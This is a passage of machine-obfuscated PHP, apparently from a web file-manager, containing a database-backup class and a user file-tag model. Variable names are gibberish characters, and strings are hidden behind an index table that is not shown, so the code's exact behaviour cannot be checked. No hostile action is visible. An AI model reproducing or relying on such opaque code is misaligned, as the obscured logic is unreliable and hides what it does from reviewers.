$°¥§á®°[786] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $†ôêá¶³ =& $_SERVER[³½¬ÚË¯]; $ÔìÁ½Ü× = Backup::get(); self::$io = $ÔìÁ½Ü×[$†ôêá¶³[787]]; self::$name = $ÔìÁ½Ü×[$†ôêá¶³[32]]; $‡üê“€ = new DbManage(); $…ÖŠŠÕ = $‡üê“€->dbType(); $ÆÇ†« = array($†ôêá¶³[812] => $…ÖŠŠÕ, $†ôêá¶³[813] => time()); Backup::set($ÆÇ†«); $§ÖÅÎªİ = $this->tmpFilesPath() . $†ôêá¶³[814] . self::$name . $†ôêá¶³[8]; del_dir($§ÖÅÎªİ); mk_dir($§ÖÅÎªİ); $Æë¯®½ = $Á„±ÃşÏ = 0; $òò¬í«¬ = new Task($†ôêá¶³[815], $†ôêá¶³[816], 0, LNG($†ôêá¶³[817]) . $†ôêá¶³[818] . LNG($†ôêá¶³[819])); try { $ŒÃä¨’û = $‡üê“€->db()->getTables(); } catch (Exception $…ŒÀÑë) { $òò¬í«¬->end(); return !1; } $ŒÃä¨’û = array_diff($ŒÃä¨’û, array($†ôêá¶³[820], $†ôêá¶³[821])); foreach ($ŒÃä¨’û as $—°Å‘¤ô) { $Æë¯®½ += $‡üê“€->model($—°Å‘¤ô)->count(); } $òò¬í«¬->task[$†ôêá¶³[822]] = $Æë¯®½; $GLOBALS[$†ôêá¶³[823]] = self::$name; foreach ($ŒÃä¨’û as $—°Å‘¤ô) { $Ù¯²‹¹¶ = $§ÖÅÎªİ . $—°Å‘¤ô . $†ôêá¶³[824]; $²ªá¯„ = null; if ($—°Å‘¤ô == $†ôêá¶³[825] && (!isset($ÔìÁ½Ü×[$†ôêá¶³[790]]) || $ÔìÁ½Ü×[$†ôêá¶³[790]] == $†ôêá¶³[212])) { $²ªá¯„ = self::$io; } $Á„±ÃşÏ += $‡üê“€->sqlFromDb($—°Å‘¤ô, $Ù¯²‹¹¶, $òò¬í«¬, $²ªá¯„); } unset($GLOBALS[$†ôêá¶³[823]]); $òò¬í«¬->end(); if ($Á„±ÃşÏ > $Æë¯®½) { $Æë¯®½ = $Á„±ÃşÏ; } $ÆÇ†« = array($†ôêá¶³[812] => $…ÖŠŠÕ, $†ôêá¶³[809] => 1, $†ôêá¶³[826] => $Æë¯®½, $†ôêá¶³[827] => $Á„±ÃşÏ, $†ôêá¶³[828] => time()); Backup::set($ÆÇ†«); if ($Æë¯®½ - $Á„±ÃşÏ > 0) { $ÒãÊ«Á = $†ôêá¶³[829]; if (stristr(I18n::getType(), $†ôêá¶³[830])) { $ÒãÊ«Á = $†ôêá¶³[831]; } write_log(array($ÒãÊ«Á, $ÆÇ†«), $†ôêá¶³[816]); return !1; } return !0; } private function tmpFilesPath() { $¨€ı²ÓÓ =& $_SERVER[³½¬ÚË¯]; $™¯â—ê© = TEMP_FILES; if ($GLOBALS[$¨€ı²ÓÓ[6]][$¨€ı²ÓÓ[89]][$¨€ı²ÓÓ[832]]) { $™¯â—ê© = $GLOBALS[$¨€ı²ÓÓ[6]][$¨€ı²ÓÓ[89]][$¨€ı²ÓÓ[832]]; if (!mk_dir($™¯â—ê©) || !is_writable($™¯â—ê©) || !IO::mkfile($™¯â—ê© . $¨€ı²ÓÓ[833])) { $™¯â—ê© = TEMP_FILES; } } return $™¯â—ê©; } } goto eÉñ™‘½´è; d±Ê–ôƒÎ‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($¼òÍÛˆ) { $²ßÜÃ¿ª =& $_SERVER[³½¬ÚË¯]; return array($²ßÜÃ¿ª[1999] => array($²ßÜÃ¿ª[2388] . USER_ID, $²ßÜÃ¿ª[2000])); } protected function listData() { $˜±’‚¨Ë =& $_SERVER[³½¬ÚË¯]; $ì‘À•÷Å = array($˜±’‚¨Ë[1681] => USER_ID, $˜±’‚¨Ë[526] => array($˜±’‚¨Ë[2003], 0)); $óÕ™˜ = $˜±’‚¨Ë[2389]; $Å¤ÍÀ = $this->field($óÕ™˜)->where($ì‘À•÷Å)->order($˜±’‚¨Ë[2006])->select(); return $Å¤ÍÀ ? $Å¤ÍÀ : array(); } protected function addToTag($Òöï³ãÕ, $³³¤á‡½) { $Şš£âıæ =& $_SERVER[³½¬ÚË¯]; if (!Model($Şš£âıæ[2148])->listData($³³¤á‡½)) { return !1; } if (is_numeric($Òöï³ãÕ)) { $÷ÇÉ€¿ = Model($Şš£âıæ[861])->pathInfo($Òöï³ãÕ); if (!$÷ÇÉ€¿) { return !1; } } else { $÷ÇÉ€¿ = IO::infoSimple($Òöï³ãÕ); if (!$÷ÇÉ€¿) { return !1; } $âúÁÙßµ = $÷ÇÉ€¿[$Şš£âıæ[32]]; $şı£±Ù½ = $÷ÇÉ€¿[$Şš£âıæ[33]]; if (isset($÷ÇÉ€¿[$Şš£âıæ[453]])) { $şı£±Ù½ = $÷ÇÉ€¿[$Şš£âıæ[453]] == $Şš£âıæ[88] ? $Şš£âıæ[75] : $Şš£âıæ[214]; } } $Ü•ˆÀÕ« = array($Şš£âıæ[1681] => USER_ID, $Şš£âıæ[526] => $³³¤á‡½, $Şš£âıæ[463] => $Òöï³ãÕ, $Şš£âıæ[464] => $şı£±Ù½ ? $şı£±Ù½ : $Şš£âıæ[458], $Şš£âıæ[462] => $âúÁÙßµ ? $âúÁÙßµ : $Şš£âıæ[12], $Şš£âıæ[1892] => 0); if ($this->where($Ü•ˆÀÕ«)->find()) { return !1; } return $this->add($Ü•ˆÀÕ«); } protected function removeFromTag($»Üä”¦, $‰õå´Áà) { $–ç¬È‰ =& $_SERVER[³½¬ÚË¯]; if (!Model($–ç¬È‰[2148])->listData($‰õå´Áà)) { return !1; } if (is_array($»Üä”¦)) { $»Üä”¦ = array($–ç¬È‰[7], $»Üä”¦); } $¤¤ó¨¤º = array($–ç¬È‰[1681] => USER_ID, $–ç¬È‰[526] => $‰õå´Áà, $–ç¬È‰[463] => $»Üä”¦); return $this->where($¤¤ó¨¤º)->delete(); } protected function removeByTag($Š‹¿â¢) { $¤ÓËü¯º =& $_SERVER[³½¬ÚË¯]; if (!$Š‹¿â¢) { return !1; } $¾Ï£´±Ø = array($¤ÓËü¯º[1681] => USER_ID, $¤ÓËü¯º[526] => $Š‹¿â¢); return $this->where($¾Ï£´±Ø)->delete(); } protected function removeBySource($ùÄôæŠŒ) { $ªôñêô€ =& $_SERVER[³½¬ÚË¯]; if (is_array($ùÄôæŠŒ)) { $ùÄôæŠŒ = array($ªôñêô€[7], $ùÄôæŠŒ); } $ÔúØôçù = array($ªôñêô€[1681] => USER_ID, $ªôñêô€[526] => array($ªôñêô€[1057], 0), $ªôñêô€[463] => $ùÄôæŠŒ); return $this->where($ÔúØôçù)->delete(); } }